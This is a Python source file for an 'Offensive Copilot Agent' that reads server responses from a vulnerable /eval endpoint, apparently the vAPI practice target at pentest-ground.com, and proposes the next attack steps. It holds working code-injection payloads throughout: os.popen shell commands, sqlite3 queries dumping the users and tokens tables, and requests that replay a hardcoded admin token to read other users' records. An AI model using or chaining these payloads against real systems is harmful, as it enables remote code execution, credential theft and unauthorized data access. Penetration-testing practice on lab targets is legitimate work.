import re

class TerminalAgent:
    def __init__(self):
        self.name = "Offensive Copilot Agent"

    def analyze_response(self, item, command, status_code, response_body):
        """Strictly inspects server response and output data to provide accurate insights."""
        analysis = {
            "status": "SUCCESS" if status_code == 200 else "ERROR",
            "suggestion": "Execution completed.",
            "corrected_payload": None,
            "next_steps": []
        }

        body_str = str(response_body)
        target = item.get("target", "").lower()
        vuln = item.get("vulnerability", "").lower()
        cmd_lower = command.lower()

        # Handle Python /eval Endpoint
        if "eval" in target or "eval" in vuln or "python" in vuln:
            
            # 1. Check if the server explicitly returned an execution error
            if status_code != 200 or "Failed to execute code" in body_str or "error" in body_str.lower():
                analysis["suggestion"] = "Python execution error or invalid syntax. Check your expression and try again."
                if not command.startswith("__import__") and "ls" in cmd_lower:
                    analysis["corrected_payload"] = "__import__('os').popen('ls').read()"
                analysis["next_steps"] = [
                    command,
                    "exec __import__('os').popen('id').read()"
                ]
                return analysis

            # 2. If execution succeeded, analyze the actual output content
            if "tokens" in body_str.lower() or "userid" in body_str.lower():
                analysis["suggestion"] = "SUCCESS: Admin token extracted! (Token: 203cc3e8cca8a5137958b23c512d93a4). You can now use this X-Auth-Token to test privileged API endpoints."
                analysis["next_steps"] = [
                    "exec __import__('urllib.request').request.urlopen(__import__('urllib.request').Request('https://pentest-ground.com:9000/user/10', headers={'X-Auth-Token': '203cc3e8cca8a5137958b23c512d93a4'})).read().decode()",
                    "exec __import__('urllib.request').request.urlopen(__import__('urllib.request').Request('https://pentest-ground.com:9000/user/1', headers={'X-Auth-Token': '203cc3e8cca8a5137958b23c512d93a4'})).read().decode()",
                    "exit"
                ]

            elif "users" in body_str.lower() or "admin1" in body_str.lower():
                analysis["suggestion"] = "SUCCESS: User database records retrieved. Next critical step: extract the active session tokens."
                analysis["next_steps"] = [
                    "exec __import__('sqlite3').connect('vAPI.db').cursor().execute('SELECT * FROM tokens').fetchall()",
                    "exit"
                ]

            else:
                analysis["suggestion"] = "Python expression evaluated successfully."
                analysis["next_steps"] = [
                    "exec __import__('sqlite3').connect('vAPI.db').cursor().execute('SELECT * FROM users').fetchall()",
                    "exec __import__('sqlite3').connect('vAPI.db').cursor().execute('SELECT * FROM tokens').fetchall()"
                ]

        return analysis
